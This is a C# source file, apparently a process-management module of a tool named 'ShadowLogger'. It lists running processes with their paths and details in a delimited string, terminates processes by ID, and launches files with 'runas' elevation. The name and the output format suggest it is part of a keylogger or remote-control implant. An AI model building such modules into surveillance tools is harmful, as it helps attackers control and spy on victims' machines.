using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace ShadowLogger.bin.Process_Management
{
    internal static class ProcessManagement
    {
        #region " P/Invoke Declarations "

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle(IntPtr hObject);

        #endregion


        internal static int[] GetProcessIdsByName(string name)
        {
            List<int> pidsToTerminate = new List<int>();

            foreach (Process p in Process.GetProcesses())
            {
                if (p.ProcessName == name)
                {
                    pidsToTerminate.Add(p.Id);
                }
                p.Dispose();
            }

            return pidsToTerminate.ToArray();
        }

        internal static void TerminateProcessById(int pid)
        {
            IntPtr pHandle = ProcessManagementHelperMethods.GetProcessTerminateHandle(pid);
            TerminateProcess(pHandle, 9);
            CloseHandle(pHandle);
        }

        internal static string ListProcesses()
        {
            StringBuilder processInfoList = new StringBuilder();

            foreach (Process p in Process.GetProcesses())
            {
                if (p.ProcessName == String.Empty)
                    continue;

                IntPtr pHandle = ProcessManagementHelperMethods.GetProcessHandle(p.Id);

                processInfoList.Append(p.ProcessName);

                string processpath = ProcessManagementHelperMethods.GetProcessPath(pHandle);

                string extension = Path.GetExtension(processpath);

                processInfoList.Append(extension + " ## ");
                processInfoList.Append(p.Id + " ## ");
                processInfoList.Append(ProcessManagementHelperMethods.GetParentProcessIdFromHandle(pHandle) + " ## ");
                processInfoList.Append(processpath + " ## ");
                processInfoList.Append(ProcessManagementHelperMethods.GetProcessMemory(p) + " ## ");
                processInfoList.Append(p.Threads.Count + " ## ");

                if (File.Exists(processpath))
                {
                    processInfoList.Append(FileVersionInfo.GetVersionInfo(processpath).FileDescription);
                }
                else
                {
                    processInfoList.Append("N/A");
                }

                CloseHandle(pHandle);
                p.Dispose();

                processInfoList.Append("|");
            }


            string[] sortedArray = processInfoList.Remove(processInfoList.Length - 1, 1).ToString().Split(Convert.ToChar("|"));

            Array.Sort(sortedArray);

            return string.Join(Environment.NewLine, sortedArray);
        }

        internal static void ExecuteFile(string filepath, bool elevate)
        {
            if (!File.Exists(filepath)) return;

            ProcessStartInfo procStartInfo = new ProcessStartInfo {FileName = filepath};

            if (elevate)
            {
                procStartInfo.Verb = "runas";
            }

            try
            {
                Process.Start(procStartInfo);
            }
            catch (Win32Exception ex)
            {
                Shared_Methods.SharedMethods.LogException(ex.TargetSite + " " + filepath + " " + elevate + " " + "Win32Exception" + " " + ex.Message + " " + ex.NativeErrorCode);
            }
        }
    }
}
